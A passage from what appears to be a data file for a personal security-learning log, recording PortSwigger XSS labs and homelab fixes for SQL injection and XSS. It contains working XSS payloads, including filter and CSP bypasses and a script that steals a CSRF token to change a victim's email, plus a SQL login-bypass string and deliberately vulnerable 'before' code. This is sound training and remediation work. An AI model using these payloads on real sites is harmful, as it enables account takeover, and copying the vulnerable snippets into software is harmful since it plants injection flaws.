      'Lab 29 ate the time. It is a dangling-markup attack under a strict CSP: no script execution, so instead you inject an unclosed tag that captures the rest of the page into an attribute that gets sent to an attacker server. I got the email field to update to the right value, followed the community notes and the official solution, and the lab still would not register as complete. Left it unsolved. Everything else in the path is done.',
      'That closes XSS, the biggest topic on the list, and it has been most of two weeks. Next is Authentication.',
    ],
    labs: [
      {
        title:
          'Lab 25: Reflected XSS with AngularJS sandbox escape without strings',
        notes: [
          'First expert-level lab, expected a big step up.',
          "It was not - the whole thing is one URL. The payload uses Angular's orderBy filter and String.fromCharCode to build the alert call with no string literals, since string literals are what the sandbox blocks.",
          'Manipulating the search param directly was enough, no exploit server needed.',
        ],
        solution:
          'https://LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1',
        status: 'completed',
      },
      {
        title: 'Lab 26: Reflected XSS with AngularJS sandbox escape and CSP',
        notes: [
          'Same class as 25 but with a CSP in place, so the payload has to come via the exploit server.',
          'The Angular payload uses ng-focus and the orderBy filter to reach alert(document.cookie); the #x fragment focuses the injected input on load to trigger ng-focus.',
          'Delivered as a script that sets location to the crafted lab URL.',
        ],
        solution:
          "<script>\nlocation='https://LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';\n</script>\n\nDelivered from the exploit server.",
        status: 'completed',
      },
      {
        title:
          'Lab 27: Reflected XSS with event handlers and href attributes blocked',
        notes: [
          'The search filter blocks event handlers and href, so onerror / onclick / javascript: href are all out.',
          'What is allowed: svg, a, animate, and the text element. The move is an svg a with an animate that sets the anchor href to a javascript: URL, plus a text element for the victim to click.',
          'First attempt did not work. Went back through it: attributename needed to be attributeName (SVG is case-sensitive), and the text element needed real x and y coordinates to be visible and clickable.',
          'Fixed the casing and coordinates and the "Click me" text fired the alert.',
        ],
        solution:
          'LAB-ID.web-security-academy.net/?search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>\n\n(URL-encoded in the search param.)',
        status: 'completed',
        screenshot: 'Burp/Lab27XSS.webp',
      },
      {
        title:
          'Lab 28: Reflected XSS in a JavaScript URL with some characters blocked',
        notes: [
          'The value is reflected into a javascript: URL with several characters blocked, so the payload has to avoid them.',
          'Attacked the postId param directly. The payload closes the surrounding context and uses an arrow function plus throw / onerror to reach alert without the blocked characters, then repairs the trailing syntax with toString and window+empty-string.',
        ],
        solution:
          'post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27',
        status: 'completed',
      },
      {
        title:
          'Lab 29: Reflected XSS protected by very strict CSP, with dangling markup attack',
        notes: [
          'Strict CSP means no script execution at all. The attack is dangling markup: inject an unclosed tag whose attribute swallows the rest of the markup up to the next matching quote, carrying a sensitive value off to an attacker URL.',
          'Injecting normal scripts into the email change does nothing, but appending markup to an email value and submitting is accepted - test@test.com"><img src= onerror=alert(1)> gets stored, and the page looks vulnerable even though nothing executes.',
          'Tried delivering it via my-account?email=... directly, and via the exploit server with a formaction button that posts to the exploit server on click.',
          "The email field updates to the injected value every time, but the lab never registers as solved. Worked through the community notes and PortSwigger's own solution and got the same result - email changes, lab stays incomplete.",
          'Leaving this one unsolved. Possibly a lab-state or delivery-timing issue on my setup rather than the payload.',
        ],
        solution:
          'Not solved. Dangling-markup payload updates the target email as expected, but the lab does not complete, including with the official solution. Revisit later.',
        status: 'blocked',
      },
      {
        title: 'Lab 30: Reflected XSS protected by CSP, with CSP bypass',
        notes: [
          'Final lab. The CSP is built from a request parameter, which means it can be tampered with.',
          "Added a second parameter that injects script-src-elem 'unsafe-inline' into the policy, re-permitting inline script, then put a normal script alert(1) in the search.",
        ],
        solution:
          "?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'\n\n(URL-encoded.)",
        status: 'completed',
      },
    ],
    tools: ['Burp Suite', 'Web Browser', 'Chrome DevTools'],
    tags: [
      'XSS',
      'reflected XSS',
      'AngularJS',
      'sandbox escape',
      'CSP bypass',
      'dangling markup',
      'SVG',
      'exploit server',
    ],
    link: {
      label: 'Cross-site scripting (XSS)',
      url: 'https://portswigger.net/web-security/cross-site-scripting',
    },
  },
  {
    id: 'portswigger-xss-labs-21-24',
    date: '2026-09-07',
    category: 'PortSwigger Labs',
    vulnTypes: ['XSS'],
    title:
      'Cross-Site Scripting (XSS) labs 21-24 (template literal, cookie/password theft, CSRF via XSS)',
    workedOn: [
      'Near the end of the XSS path, Labs 21 to 24 - moving from injection mechanics into what XSS is actually for',
      'Lab 21: reflected XSS into a template literal, triggered with ${} instead of a tag or quote breakout',
      'Labs 22-23: cookie theft and password capture - both built around Burp Collaborator (Pro). Skipped 22; attempted the Collaborator-free version of 23 and could not get it to complete. Both parked for a Burp Pro trial',
      "Lab 24: using XSS to run a CSRF attack - reading the victim's CSRF token and changing their email. Completed",
    ],
    body: [
      'These four are the turn from "can I get an alert to fire" to "what does an attacker do with that". Lab 21 is the last of the pure injection-mechanics labs; 22 to 24 are exfiltration and account takeover.',
      'The Pro wall is real here. Labs 22 and 23 are built around Burp Collaborator for catching stolen data out of band, and that is Professional-only. 23 has a documented Collaborator-free method that drops the data into a second blog comment, but I could not get it to complete even after fixing an obvious bug in the code-along script. Parking both until I can run a Burp Pro trial rather than pretending they are done.',
      "Lab 24 did work, and it is the one that clicked conceptually. The injected script silently GETs /my-account, pulls the CSRF token out of the response with a regex, then POSTs to /my-account/change-email with that token. It is same-origin, so the token is readable and the request is trusted. XSS bypasses CSRF protection entirely because the malicious request now comes from the site's own page.",
    ],
    labs: [
      {
        title:
          'Lab 21: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped',
        notes: [
          "Searched p3p and checked the DOM. It shows up twice - once in the search message and once in a script, inside a template literal: var message = `0 search results for 'p3p'`.",
          'Every breakout character is Unicode-escaped: angle brackets, both quote types, backslash, backtick. So no closing the string and no opening a tag.',
          'A template literal evaluates ${ } as JavaScript, and the braces are not escaped. Searching ${alert(1)} runs it directly.',
        ],
        solution: '${alert(1)}',
        status: 'completed',
      },
      {
        title: 'Lab 22: Exploiting cross-site scripting to steal cookies',
        notes: [
          "The goal is a real attack: stored XSS in the blog comments to exfiltrate another user's session cookie and reuse it.",
          'The exfiltration step sends the cookie to an attacker-controlled endpoint, which the lab expects to be Burp Collaborator - a Professional feature.',
          'No Collaborator-free path documented for this one, so skipped.',
        ],
        solution:
          'Not attempted - requires Burp Suite Professional (Collaborator/OAST).',
        status: 'blocked',
      },
      {
        title: 'Lab 23: Exploiting cross-site scripting to capture passwords',
        notes: [
          'Same idea as 22 but capturing an auto-filled username and password rather than a cookie.',
          'PortSwigger documents a Collaborator-free version: inject a script that reads the credential fields and posts them back as a new blog comment, so the data lands somewhere I can read without an external listener.',
          'Worked through the code-along - a script that grabs the csrf token and the username/password fields, builds a FormData, and fetches POST /post/comment with them.',
          'Could not get it to fire. Retraced it step by step and asked Claude for a tip, still nothing.',
          'Spotted that the code-along script calls document.getElementByName, which is not a real DOM method - it is document.getElementsByName (plural). Fixed that and re-ran it, and the lab still would not complete. Something else is off, either in my payload or the lab state.',
          'Parking this one alongside Lab 22. Both are worth coming back to on a Burp Pro trial, where the intended Collaborator-based solution removes the moving parts.',
        ],
        solution:
          'Not solved. Attempted the Collaborator-free comment-drop method as a code-along, including after fixing document.getElementByName to getElementsByName; the lab did not complete. Revisit with Burp Collaborator.',
        status: 'blocked',
      },
      {
        title: 'Lab 24: Exploiting XSS to bypass CSRF defenses',
        notes: [
          'XSS used to carry out a CSRF attack: submit a state-changing request as the victim, from the page they already trust.',
          'Back on the blog post, using a script tag in a comment.',
          'The script GETs /my-account, pulls the CSRF token out of the response with a regex on name="csrf" value="(\\w+)", then POSTs to /my-account/change-email with that token and an attacker-controlled email.',
          'Ran it as a code-along. It submitted and completed the lab. Every user who views the page now hands their email change to the address I set, and from there the attacker can trigger a password reset.',
          'The point: CSRF tokens do not help when the attacker has XSS. A same-origin script can read the token and send the request itself.',
        ],
        solution:
          "<script>\nvar req = new XMLHttpRequest();\nreq.onload = handleResponse;\nreq.open('get','/my-account',true);\nreq.send();\nfunction handleResponse() {\n    var token = this.responseText.match(/name=\"csrf\" value=\"(\\w+)\"/)[1];\n    var changeReq = new XMLHttpRequest();\n    changeReq.open('post', '/my-account/change-email', true);\n    changeReq.send('csrf='+token+'&email=test@test.com')\n};\n</script>",
        status: 'completed',
      },
    ],
    tools: ['Burp Suite', 'Web Browser', 'Chrome DevTools'],
    tags: [
      'XSS',
      'reflected XSS',
      'stored XSS',
      'template literals',
      'cookie theft',
      'CSRF',
      'exploit server',
      'Burp Collaborator',
    ],
    link: {
      label: 'Cross-site scripting (XSS)',
      url: 'https://portswigger.net/web-security/cross-site-scripting',
    },
  },
  {
    id: 'portswigger-xss-labs-15-20',
    date: '2026-09-06',
    category: 'PortSwigger Labs',
    vulnTypes: ['XSS'],
    title:
      'Cross-Site Scripting (XSS) labs 15-20 (custom tags, SVG, canonical link, JS string escaping, stored onclick)',
    workedOn: [
      'Kept going on the XSS path, Labs 15 to 20 - all filter and encoding evasion',
      'Labs 15-16: filters that block every standard tag - a custom element with onfocus, and the SVG animatetransform / onbegin combo, both found with Intruder',
      'Lab 17: reflected XSS into a canonical link tag with no visible input, made clickable with accesskey',
      'Labs 18-19: reflected XSS into a JavaScript string with the quote and backslash escaped - breaking out with </script>, then with a trailing comment',
      'Lab 20: the stored version, using the comment website field and HTML entities to get past blocked characters',
    ],
    body: [
      'Second XSS session today. These six are all filter evasion: the injection point is obvious, the work is finding what the WAF or the encoding actually lets through.',
      'Intruder came out again for 15 and 16, same method as Lab 14 - fire the cheatsheet at the filter and watch for 200s, first for tags then for event handlers. Slow on the free version but it is the only way through when the allowed set is small.',
      'Lab 17 taught me something new. There is no search box - the value is reflected into a <link rel="canonical"> tag in the head that the user never sees. accesskey binds the injected onclick to a keypress, so the exploit works by getting the victim to press a key rather than click a visible element.',
    ],
    labs: [
      {
        title:
          'Lab 15: Reflected XSS into HTML context with all tags blocked except custom ones',
        notes: [
          'The WAF blocks every standard tag - anything in the search comes back as a JSON error saying the tag is not allowed.',
          'A custom element gets through. A custom tag with an alert works when loaded directly, but that is not the lab - it wants the alert to fire for a victim via the exploit server.',
          'The payload shape: a custom tag with onfocus=alert(document.cookie), plus id and tabindex so the element is focusable and has a fragment target.',
          'Sent it through the search and it was not blocked.',
          'From the exploit server, a script that sets location to the lab search URL with the payload, ending in #x so the browser focuses the element with id x on load and fires onfocus.',
        ],
        solution:
          '<script>\nlocation = "https://LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x";\n</script>\n\nDelivered from the exploit server.',
        status: 'completed',
        screenshot: 'Burp/Lab15XSS.webp',
      },
      {
        title: 'Lab 16: Reflected XSS with some SVG markup allowed',
        notes: [
          'Standard tags blocked again. Back to Intruder with the tag list.',
          'svg and animatetransform both return 200. animatetransform lives inside svg - note to self.',
          'Then a second Intruder run over event handlers to find one the WAF allows.',
          'onbegin returns 200. animatetransform fires onbegin when its animation starts, so no user interaction is needed.',
        ],
        solution: "<svg><animatetransform onbegin='alert(1)'>",
        status: 'completed',
      },
      {
        title: 'Lab 17: Reflected XSS in canonical link tag',
        notes: [
          'No visible input. The value is reflected into a <link rel="canonical"> tag in the head, which the user never sees.',
          "Attacked the URL directly. Tried ?'onclick=alert(1) - nothing happened, and the DOM showed a trailing quote left over.",
          "Used that trailing quote: ?'onclick='alert(1) closed the attribute cleanly and the onclick listener landed.",
          'The tag is not clickable in any normal way, so the trigger is an access key - accesskey binds the onclick to a keypress.',
        ],
        solution:
          "https://LAB-ID.web-security-academy.net/?'accesskey='x'onclick='alert(1)\n\nVictim presses the access key to fire it.",
        status: 'completed',
        screenshot: 'Burp/Lab17XSS.webp',
      },
      {
        title:
          'Lab 18: Reflected XSS into a JavaScript string with single quote and backslash escaped',
        notes: [
          "Ran a unique search (p3p) and checked the DOM. It appears three times, including inside a script and an img tag: var searchTerms = 'p3p'; document.write(...).",
          'Tried to break out of the string. Adding my own backslash to escape the escaping just gets more backslashes added - the single quote and backslash are both escaped, exactly what the title says.',
          'Since the string cannot be broken, went for the script element instead: close the current script and open a new one with the alert.',
        ],
        solution: '</script><script>alert(1)</script>',
        status: 'completed',
      },
      {
        title:
          'Lab 19: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped',
        notes: [
          'Angle brackets and double quotes HTML-encoded, single quotes escaped. Checked the DOM and saw the backslashes being added.',
          "Tried \\' + alert() - did not work.",
          "Added the trailing comment: \\' + alert()// - the // swallows the rest of the line so the leftover quote does not break the syntax. That worked.",
        ],
        solution: "\\' + alert()//",
        status: 'completed',
      },
      {
        title:
          'Lab 20: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped',
        notes: [
          'Stored version of the same idea, so back to the comment section. A comment renders the website field as a hyperlink on the commenter name.',
          'Angle brackets, double quotes, single quotes and backslash are all blocked or escaped. HTML entities are not.',
          'Put the payload in the website field so it lands in the onclick of that link: http://foo?&apos;-alert(1)-&apos;. &apos; is the HTML entity for a single quote, which the browser decodes inside the onclick attribute, so -alert(1)- runs when the link is clicked.',
          'First try used a colon instead of the semicolon on &apos; - fixed that and it worked.',
        ],
        solution:
          'http://foo?&apos;-alert(1)-&apos;\n\nSet as the website field on a comment; fires when the name link is clicked.',
        status: 'completed',
      },
    ],
    tools: ['Burp Suite', 'Burp Intruder', 'Web Browser', 'Chrome DevTools'],
    tags: [
      'XSS',
      'reflected XSS',
      'stored XSS',
      'WAF bypass',
      'Burp Intruder',
      'SVG',
      'custom elements',
      'HTML entities',
      'exploit server',
    ],
    link: {
      label: 'Cross-site scripting (XSS)',
      url: 'https://portswigger.net/web-security/cross-site-scripting',
    },
  },
  {
    id: 'portswigger-xss-labs-12-14',
    date: '2026-09-06',
    category: 'PortSwigger Labs',
    vulnTypes: ['XSS'],
    title:
      'Cross-Site Scripting (XSS) labs 12-14 (DOM eval sink, stored DOM, tag/attribute brute-forcing)',
    workedOn: [
      'Back on the PortSwigger XSS path after the homelab work, Labs 12 to 14',
      'Lab 12: reflected DOM XSS, breaking out of a string that gets passed to eval()',
      'Lab 13: stored DOM XSS through the blog comment form',
      'Lab 14: reflected XSS with most tags and attributes blocked, using Burp Intruder to brute-force which tag and attribute get through',
    ],
    body: [
      'Switched back to PortSwigger after a couple of days finding and fixing the same bug classes in my own app. These three are all practitioner-level and all on the same blog lab I have been using.',
      'Lab 14 was the first time I have used Burp Intruder properly. On the free version it rate-limits hard, so the tag and attribute brute-forcing is slow, but the method is the point: fire the whole PortSwigger cheatsheet of tags at the filter, watch for the 200s, then repeat for attributes on whichever tag survived.',
      'Two of these came down to eval(). Note to self, which the labs keep reinforcing: never build a string out of user input and hand it to eval().',
    ],
    labs: [
      {
        title: 'Lab 12: Reflected DOM XSS',
        notes: [
          'Searched a unique random word (p3p) in the blog search and checked the DOM. The term shows up in the h1, but there is no inline script putting it there.',
          'Found the JavaScript in the Network tab, not obfuscated. The response shows the whole search handler: it takes the JSON search-results response and runs it through eval() to parse it, so the reflected search term ends up inside a string that eval() executes.',
          'eval() on a string built from user input is the whole vulnerability. The search term sits inside a double-quoted string in that eval call, so the goal is to break out of the string.',
          'Intercepted the search request in Burp and tried search=p3p"-alert(). That did not break out - the original string\'s closing quote was still in the way.',
          'Added a backslash to escape into the string and tried a few variants. Got tripped up by an extra space at one point which broke the payload; removed it and still no alert. The trailing quote from the original string kept the statement from being valid JavaScript.',
          'Per the PortSwigger notes, commented out the rest of the line with // so the leftover " does not throw a syntax error. That made it fire.',
          'Final payload breaks down as: \\" escapes into the string, -alert() runs, } closes the object literal, // comments out the rest of the line.',
        ],
        solution:
          'p3p\\"-alert()}//\n\nFull URL: https://LAB-ID.web-security-academy.net/?search=p3p\\%22-alert()}//',
        status: 'completed',
        screenshot: 'Burp/Lab12XSS.webp',
      },
      {
        title: 'Lab 13: Stored DOM XSS',
        notes: [
          'Quick recap that stuck: three types of XSS - reflected, stored, and DOM-based. Stored is the one that gets saved server-side and fires later when another user loads it.',
          'Back on the blog, using the comment form as the input. The DOM has a script that takes the comment and inserts it into the page.',
          'Sent plain HTML first - a couple of h1 tags - and checked the DOM. Got <h1>Hello World back with no closing tag, rendered as a heading, so the comment is not being HTML-encoded on the way in.',
          'Tried <h1><h1 onmouseover=alert()">Hello</h1>. It did not fire - I had left the opening double quote off the handler. Fixed the quotes and the onmouseover alert worked on hover, but the lab still would not mark complete.',
          'The lab wants the alert to fire on load, not on an interaction. Switched to an img onerror payload so it fires by itself. Fumbled it a couple of times - missing quote, missing brackets - then landed on the working one. The <> is junk that breaks the surrounding parsing, the img has a bad src so onerror runs alert(1) straight away.',
        ],
        solution: '<><img src=1 onerror=alert(1)>',
        status: 'completed',
      },
      {
        title:
          'Lab 14: Reflected XSS into HTML context with most tags and attributes blocked',
        notes: [
          'The search input is filtered by a WAF. The usual payloads are blocked, but the angle brackets themselves are not, so a tag can still be formed - the filter is on which tags and attributes are allowed through.',
          'First real use of Burp Intruder. Copied the full tag list from the PortSwigger XSS cheatsheet as the payload set and fired it at the search param, watching the status codes. On the free version this is slow because Intruder is throttled.',
          'body came back 200 while the rest were blocked, so <body> gets through the filter.',
          'Set up a second Intruder run against attributes on body: search=<body%20[attr]=1>. Waited that one out too.',
          'onresize survived. body plus onresize means the payload needs something that actually resizes the element, which is where the exploit-server iframe comes in: load the lab in an iframe and change its width onload so the onresize handler on the injected body fires.',
          'Delivered from the exploit server.',
        ],
        solution:
          '<iframe src="https://LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width=\'100px\'>\n\nDelivered from the exploit server.',
        status: 'completed',
      },
    ],
    tools: ['Burp Suite', 'Burp Intruder', 'Web Browser', 'Chrome DevTools'],
    tags: [
      'XSS',
      'DOM XSS',
      'reflected XSS',
      'stored XSS',
      'eval',
      'Burp Intruder',
      'WAF bypass',
      'exploit server',
    ],
    link: {
      label: 'Cross-site scripting (XSS)',
      url: 'https://portswigger.net/web-security/cross-site-scripting',
    },
  },
  {
    id: 'appsec-homelab-entry-13-product-search-xss-fix',
    date: '2026-09-05',
    category: 'AppSec Homelab',
    vulnTypes: ['AppSec Homelab', 'XSS'],
    title: 'Exploiting and fixing the product search XSS',
    workedOn: [
      'Tried a manual XSS against the product search input, which the codebase already showed was vulnerable',
      'Confirmed it: <img src=x onerror="alert(document.domain)"> fires an alert showing the page\'s own domain',
      'Fixed it by rendering the query through JSX text interpolation ({submittedQuery}) instead of raw HTML, so React escapes it automatically',
      'Chased a false alarm where search appeared broken after the fix - the dotnet backend was still stopped from earlier, unrelated to the fix itself',
      'Re-tested with a real search term and confirmed the payload no longer executes',
    ],
    body: [
      'Two exploits fixed, one more to try. XSS is the last of the vulnerabilities I already knew was seeded in the app, from having read the codebase.',
      'Ran npm run dev and pointed it at the same product search input from earlier. Tried <img src=x onerror="alert(document.domain)"> in the search box.',
      'It fired. The onerror handler runs as soon as the broken image tries and fails to load, popping an alert with document.domain: localhost. DevTools showed the raw img tag sitting straight in the DOM, unescaped, exactly where the search term gets echoed back.',
      "Tried a couple of variations to see what else I could get out of it beyond the alert box, but nothing more came of it - the input doesn't reach anywhere more interesting than the DOM in this app.",
      'Fixed the display so React renders it as text instead of markup (before/after, below). JSX escapes anything interpolated this way by default, so a string that looks like an img tag comes out on the page as literal characters instead of parsed HTML.',
      'Retested and thought I had broken the search feature entirely - no results were coming back for a normal term either. Turned out I had stopped the dotnet build for the backend earlier in the day and forgotten about it, so nothing was reaching the database. Not related to the fix at all.',
      'Restarted the backend, searched for laptop, and it worked properly - a real result back, and the earlier payload now shows up as plain text instead of executing. Three for three on the seeded vulnerabilities now: the login bypass, the product search SQLi, and this one.',
    ],
    codeSnippets: [
      {
        label: 'Product search result - before (dangerouslySetInnerHTML)',
        code: '<p\n  dangerouslySetInnerHTML={{\n    __html: `You searched for: ${submittedQuery}`,\n  }}\n/>',
      },
      {
        label: 'Product search result - after (JSX text interpolation)',
        code: '<p>You searched for: {submittedQuery}</p>',
      },
    ],
    screenshots: [
      'Homelab/HomeLabXSS1.webp',
      'Homelab/HomeLabXSS2.webp',
      'Homelab/HomeLabXSSFix1.webp',
      'Homelab/HomeLabXSS3.webp',
    ],
    tools: ['React', 'JSX', 'Chrome DevTools'],
    tags: ['AppSec homelab', 'XSS', 'reflected XSS', 'output encoding'],
    link: {
      label: 'appsec-homelab repo',
      url: 'https://github.com/charles-goodsir/appsec-homelab',
    },
  },
  {
    id: 'appsec-homelab-entry-12-product-search-sqli-fix',
    date: '2026-09-05',
    category: 'AppSec Homelab',
    vulnTypes: ['AppSec Homelab', 'SQL Injection'],
    title: 'Fixing the ProductsController SQL injection',
    workedOn: [
      'Fixed the SQL injection in the product search endpoint (ProductsController.cs), the other of the two SQLi bugs seeded in the app and the one Semgrep does flag',
      'Used the same fix as the AuthController.cs login bypass: bound the search term with CreateParameter instead of interpolating it into the LIKE clause',
      'Confirmed the fix with curl: a normal search still returns real results, and a query ending in a single quote now returns an empty array instead of breaking out of the query',
    ],
    body: [
      'Straight on to the next exploit fix. This one is the product search endpoint, which is the SQLi Semgrep does flag - the counterpart to the AuthController.cs login bypass from earlier today, which it does not.',
      'The vulnerable code, commented in the repo as A05:2025 - Injection, is the same raw string concatenation pattern as the login query, just a LIKE clause instead of an equality check (before, below).',
      'Fixed it the same way as AuthController.cs: created a parameter instead of interpolating it, binding the value instead of building it into the SQL string (after, below).',
      'Tested with curl -s "http://localhost:5001/api/products/search?query=lap" first, which comes back with the real product as expected - the Laptop Stand. Then curl -s "http://localhost:5001/api/products/search?query=test\'", a query ending in a single quote, which would have broken out of the LIKE clause on the old code. It comes back as an empty array instead, so the fix holds.',
      'Two for two now on the seeded SQLi bugs, the login bypass and the product search, both fixed the same way. Next is checking whether anything else in the app needs the same treatment.',
    ],
    codeSnippets: [
      {
        label: 'ProductsController.cs - before (string interpolation)',
        code: '// VULNERABLE: raw string concatenation into SQL (A05:2025 - Injection)\nvar sql = $"SELECT Id, Name, Description FROM Products WHERE Name LIKE \'%{query}%\'";\n\nusing var connection = _db.Database.GetDbConnection();\nconnection.Open();\nusing var command = connection.CreateCommand();\ncommand.CommandText = sql;\nusing var reader = command.ExecuteReader();',
      },
      {
        label: 'ProductsController.cs - after (parameterized)',
        code: 'var queryParam = command.CreateParameter();\nqueryParam.ParameterName = "@Query";\nqueryParam.Value = $"%{query}%";\ncommand.Parameters.Add(queryParam);\nusing var reader = command.ExecuteReader();',
      },
    ],
    screenshots: [
      'Homelab/SQLiHomeLabProductFix.webp',
      'Homelab/HomeLabProductFix2.webp',
      'Homelab/HomeLabProductFix3.webp',
    ],
    tools: ['.NET / C#', 'curl'],
    tags: [
      'AppSec homelab',
      'SQL injection',
      'parameterized queries',
      'OWASP Top 10',
    ],
    link: {
      label: 'appsec-homelab repo',
      url: 'https://github.com/charles-goodsir/appsec-homelab',
    },
  },
  {
    id: 'appsec-homelab-entry-11-login-bypass-fix',
    date: '2026-09-05',
    category: 'AppSec Homelab',
    vulnTypes: ['AppSec Homelab', 'SQL Injection'],
    title: 'Exploiting and fixing a SQL injection login bypass',
    workedOn: [
      'Tried a manual SQL injection against the login endpoint of my own appsec-homelab app, using PortSwigger technique on a codebase I built myself',
      "Confirmed the exploit: administrator' -- as the username with any password logs in as admin",
      'Fixed the vulnerable query in AuthController.cs, first with EF Core parameters via AddWithValue, then properly with CreateParameter after a build error',
      'Committed the fix and watched the pipeline run: Semgrep still does not flag AuthController.cs, matching the false negative documented in Entry 5',
    ],
    body: [
      "Next day in the homelab. Plan was to take what I've been drilling in PortSwigger and turn it on my own app: a manual UNION-based SQL injection against the login endpoint in appsec-homelab.",
      'First, the baseline. curl -i -X POST http://localhost:5001/api/auth/login -H \'Content-Type: application/json\' -d \'{"username":"<a seeded user>","password":"<their real password>"}\'. That is what a normal login looks like.',
      'Then the exploit, and it turned out to be simpler than the UNION attack I went in expecting. Same request, but {"username":"administrator\' --","password":"anything"}. The -- comments out the rest of the WHERE clause, so the password check never runs. Any string in the password field logs in as administrator. Same category of bug I have been practicing on PortSwigger, just the classic auth-bypass shape rather than a UNION extraction.',
      'Finding it is one thing, fixing it in code is the actual point of this repo. The original AuthController.cs built the query by string interpolation - whatever came in on the username and password fields landed straight in the SQL text (before, below).',
      'First fix used command.Parameters.AddWithValue("@Name", request.Username) and the same for the password, binding the values instead of interpolating them. Ran dotnet build and it failed. Rather than guess further, switched approach.',
      'Second attempt built the parameters manually with CreateParameter() instead (after, below). That built cleanly.',
      "Re-ran the same curl exploit against the fixed endpoint and it no longer worked. The username value is now bound as a literal parameter instead of concatenated into the query text, so administrator' -- just gets treated as a username string that does not exist, which is the point of parameterization.",
      "Committed the fix and pushed. The pipeline ran and Semgrep flagged ProductsController.cs's injection like it always does, but still said nothing about AuthController.cs - same false negative as Entry 5, except now it applies to a fixed endpoint instead of a vulnerable one. The tool's blind spot on [FromBody]-bound input cuts both ways: it never caught the bug and it will not confirm the fix either. Manual testing is still the only thing that actually proves either state here.",
      'Onto the next exploit and fix. Same drill on whatever the ProductsController vulnerability turns up.',
    ],
    codeSnippets: [
      {
        label: 'AuthController.cs - before (string interpolation)',
        code: "var sql = $\"SELECT Id, Username FROM Users WHERE Username = '{request.Username}' AND Password = '{request.Password}'\";\n\nusing var connection = _db.Database.GetDbConnection();\nconnection.Open();\nusing var command = connection.CreateCommand();\ncommand.CommandText = sql;\nusing var reader = command.ExecuteReader();",
      },
      {
        label: 'AuthController.cs - after (parameterized)',
        code: 'var sql = "SELECT Id, Username FROM Users WHERE Username = @Name AND Password = @Password";\n\nusing var connection = _db.Database.GetDbConnection();\nconnection.Open();\nusing var command = connection.CreateCommand();\ncommand.CommandText = sql;\nvar nameParam = command.CreateParameter();\nnameParam.ParameterName = "@Name";\nnameParam.Value = request.Username;\ncommand.Parameters.Add(nameParam);\nvar passwordParam = command.CreateParameter();\npasswordParam.ParameterName = "@Password";\npasswordParam.Value = request.Password;\ncommand.Parameters.Add(passwordParam);\nusing var reader = command.ExecuteReader();',
      },
    ],
    screenshots: [
      'Homelab/SQLiHomeLabDay2.webp',
      'Homelab/SQLiHomeLabDay2.1.webp',
      'Homelab/SQLiHomeLabLoginFix.webp',
      'Homelab/SQLiHomeLabGrep.webp',
    ],
    tools: ['.NET / C#', 'curl', 'GitHub Actions', 'Semgrep'],
    tags: [
      'AppSec homelab',
      'SQL injection',
      'authentication bypass',
      'parameterized queries',
    ],
    link: {
      label: 'appsec-homelab repo',
      url: 'https://github.com/charles-goodsir/appsec-homelab',
    },
  },
  {
    id: 'appsec-homelab-entry-10-zap-remediation-final',
    date: '2026-09-03',
    category: 'AppSec Homelab',
    vulnTypes: ['AppSec Homelab'],
    title: 'ZAP remediation, final round',
    workedOn: [
      'Added the last batch of response headers to frontend/nginx.conf: Cross-Origin-Opener-Policy, Cross-Origin-Resource-Policy, Cross-Origin-Embedder-Policy, and a Permissions-Policy that disables geolocation, camera, and microphone',
      "Added form-action 'self' to the CSP, which cleared the undefined-directive warning from the second scan",
      'Rebuilt the app and ran the third ZAP baseline scan for the final before and after',
      'Called the remediation loop finished: 3 warnings left, all documented trade-offs or informational',
    ],
    body: [
      'Third and last pass at the ZAP findings. The second scan left the three cross-origin headers, the Permissions-Policy header, and a still-weak CSP open, so this round closes those out.',
      'Added to frontend/nginx.conf: Cross-Origin-Opener-Policy: same-origin, Cross-Origin-Resource-Policy: same-origin, Cross-Origin-Embedder-Policy: require-corp, and Permissions-Policy: geolocation=(), camera=(), microphone=(). I left a comment on the COEP line noting that require-corp can break cross-origin loads. It is safe here because everything the app loads is same-origin, but it is not a header to apply blindly on a site that pulls in third-party resources.',
      "For the CSP, adding form-action 'self' cleared the failure-to-define-directive-with-no-fallback warning from round 2.",
      'Then rebuilt and re-ran the same scan: docker compose up -d --build, then docker run -t -v $(pwd):/zap/wrk/:rw zaproxy/zap-stable zap-baseline.py -t http://192.168.88.13:8080 -r zap-report-3.html.',
      'The numbers across the three rounds: round 1 was 8 warnings and 59 passes, round 2 was 5 and 62, round 3 is 3 and 64. The three that are left are all deliberate. The CSP still allows unsafe-inline for styles, which I have kept for a v1 policy and noted in the nginx comments. The other two, storable and cacheable content and the modern-web-application flag, are informational only.',
      'I am calling this the stopping point for the remediation loop. Everything fixable with a header is fixed, and what is left is either informational or a justified trade-off documented in the config itself. Chasing the last three further is diminishing returns for a homelab. The point was to show the fix-and-verify loop works, not to force a zero-warning scan.',
      'Where things stand: SAST, secrets scanning, and DAST are all working, and the DAST side now has three full rounds documented as a clean before and after. The pipeline is proven on findings I found myself, not theoretical ones. Next is the OWASP Top 10 mapping: take the vulns from PortSwigger, manual testing, and this ZAP work and tie each one to its Top 10 category for the writeup. Then back to the PortSwigger XSS labs.',
      'This is the strongest single artifact in the homelab so far: a real three-round fix-and-verify cycle with before and after numbers, not a one-off scan. The Cross-Origin-Embedder-Policy comment is the part worth raising in interviews. Knowing when a security header is risky to apply blindly is a better signal than knowing the headers exist.',
    ],
    screenshots: [
      'Homelab/HomeLab3.webp',
      'Homelab/HomeLab3GhAction.webp',
      'Homelab/HomeLab4.webp',
    ],
    tools: ['OWASP ZAP', 'Docker', 'nginx'],
    tags: [
      'AppSec homelab',
      'DAST',
      'OWASP ZAP',
      'security headers',
      'CSP',
      'CI/CD pipeline',
    ],
    links: [
      {
        label: 'First ZAP baseline report',
        url: '/zap-report.html',
